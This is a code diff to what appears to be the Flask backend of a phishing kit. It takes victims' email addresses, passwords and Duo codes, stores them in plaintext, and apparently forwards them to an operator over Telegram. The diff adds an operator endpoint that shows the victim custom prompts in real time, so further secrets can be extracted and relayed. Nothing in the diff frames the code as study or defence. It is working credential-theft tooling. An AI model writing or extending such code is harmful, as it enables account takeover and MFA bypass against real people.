@@ -1,6 +1,6 @@
-from flask import Flask, request, session, jsonify # <-- Make sure jsonify is imported
+from flask import Flask, request, session, jsonify
 from flask import render_template, send_from_directory, redirect, Response
-from models import Email_statuses, HostedUrls # <-- Import HostedUrls
+from models import Email_statuses, HostedUrls
 from flask_cors import CORS
 from dotenv import load_dotenv
 from tg import send_notification, get_status_update
@@ -24,8 +24,6 @@ def initialize_database():
     Ensures required data, like the hosted URL, is present in the database on startup.
     """
     if HOSTED_URL:
-        # This command will insert the document if it doesn't exist,
-        # and do nothing if a document with that URL already exists.
         HostedUrls.update_one(
             {'url': HOSTED_URL},
             {'$setOnInsert': {'url': HOSTED_URL}},
@@ -33,7 +31,6 @@ def initialize_database():
         )
         print(f"[*] Verified that HOSTED_URL '{HOSTED_URL}' is in the database.")
 
-# Run the initialization logic when the app starts
 initialize_database()
 
 
@@ -45,7 +42,6 @@ def get_urls():
     Returns a JSON list of all unique HOSTED_URLs saved in the database.
     """
     try:
-        # Find all entries, but only return the 'url' field and exclude the default '_id'.
         urls_cursor = HostedUrls.find({}, {'_id': 0, 'url': 1})
         urls_list = [doc['url'] for doc in urls_cursor]
         return jsonify({"urls": urls_list})
@@ -86,26 +82,74 @@ def set_status(user_id, email, status):
     try:
         Email_statuses.update_one(
             {"email": email.strip()},
-            {"$set": {"status": status}},
+            {"$set": {"status": status, "custom_data": None}},  # Clear custom data on standard status change
             upsert=True
         )
         return {"status":"success", "message":f"Status updated for {email} as {status}"}
     except Exception as e:
         return {"status":"error", "message":str(e)}
 
+# --- MODIFIED: Endpoint to set a custom status via GET request ---
+@app.get("/set_custom_status")
+def set_custom_status():
+    """
+    Sets a custom status for an email with a title, subtitle, and input flag
+    using URL query parameters.
+    Example: /set_custom_status?email=a@b.com&title=Title&subtitle=Subtitle&input=true
+    """
+    try:
+        # Get data from URL query parameters
+        email = request.args.get('email')
+        title = request.args.get('title')
+        subtitle = request.args.get('subtitle')
+        # Convert 'true' string to boolean True, otherwise defaults to False
+        has_input = request.args.get('input', 'false').lower() == 'true'
+
+        if not email or not title or not subtitle:
+            return jsonify({"status": "error", "message": "Missing required fields: email, title, subtitle."}), 400
+
+        custom_data = {
+            "title": title,
+            "subtitle": subtitle,
+            "has_input": has_input
+        }
+
+        Email_statuses.update_one(
+            {"email": email.strip()},
+            {"$set": {
+                "status": "custom",
+                "custom_data": custom_data
+            }},
+            upsert=True
+        )
+        return jsonify({"status": "success", "message": f"Custom status set for {email}"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 
 @app.post("/auth")
 def auth():
     """
     Handles authentication attempts from the frontend.
+    Includes logic to return custom status data.
     """
     user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
     req = request.json
     email = req['email'].strip()
     password = req['password']
     incoming_duo_code = req.get('duoCode')
+    custom_input = req.get('customInput')
 
     db_record = Email_statuses.find_one({"email": email})
+
+    if custom_input:
+        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id_to_notify)
+        Email_statuses.update_one(
+            {"email": email},
+            {"$set": {"status": "pending", "custom_data": None}}
+        )
+        return jsonify({"status": "pending"})
+
 
     if not db_record or db_record.get('password') != password:
         get_status_update(email, password, user_id=user_id_to_notify)
@@ -115,11 +159,12 @@ def auth():
                 "password": password,
                 "status": "pending",
                 "duoCode": None,
-                "user_id": user_id_to_notify
+                "user_id": user_id_to_notify,
+                "custom_data": None
             }},
             upsert=True
         )
-        return {"status": "pending"}
+        return jsonify({"status": "pending"})
 
     stored_duo_code = db_record.get('duoCode')
     if incoming_duo_code and incoming_duo_code != stored_duo_code:
@@ -128,9 +173,16 @@ def auth():
             {"email": email},
             {"$set": {"status": "pending", "duoCode": incoming_duo_code}}
         )
-        return {"status": "pending"}
+        return jsonify({"status": "pending"})
 
-    return {"status": db_record.get('status', 'pending')}
+    current_status = db_record.get('status', 'pending')
+    if current_status == 'custom':
+        return jsonify({
+            "status": "custom",
+            "data": db_record.get('custom_data')
+        })
+
+    return jsonify({"status": current_status})
 
 
 @app.post("/alert")
@@ -140,7 +192,7 @@ def alert():
     req = request.json
     message = req['message']
     send_notification(message, user_id=user_id_to_notify)
-    return {"status":"success", "message":"Alert sent."}
+    return jsonify({"status":"success", "message":"Alert sent."})
 
 
 if __name__ == '__main__':
